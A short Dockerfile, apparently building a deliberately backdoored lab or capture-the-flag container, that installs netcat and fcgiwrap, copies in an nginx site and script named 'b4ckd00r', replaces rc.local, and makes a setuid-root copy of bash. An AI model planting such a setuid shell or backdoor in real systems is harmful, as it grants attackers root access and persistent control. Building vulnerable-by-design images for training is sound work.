FROM ubuntu:16.04
LABEL maintainer="ommadawn46"

COPY ng1nx-b4ckd00r /etc/nginx/sites-available/b4ckd00r
COPY b4ckd00r.sh /home/HACKERMAN/b4ckd00r.sh
COPY rc.l0c4l /etc/rc.local

RUN apt-get update && apt-get -y install \
    fcgiwrap \
    netcat \
    nginx=1.10.3-0ubuntu0.16.04.3 \
 && cp /bin/bash /home/HACKERMAN/bash \
 && chmod 4755 /home/HACKERMAN/bash \
 && chmod 755 /home/HACKERMAN/b4ckd00r.sh /etc/rc.local \
 && mkdir -p /etc/nginx/sites-enabled \
 && ln -s /etc/nginx/sites-available/b4ckd00r /etc/nginx/sites-enabled/b4ckd00r \
 && systemctl enable nginx

EXPOSE 80
CMD ["/sbin/init"]
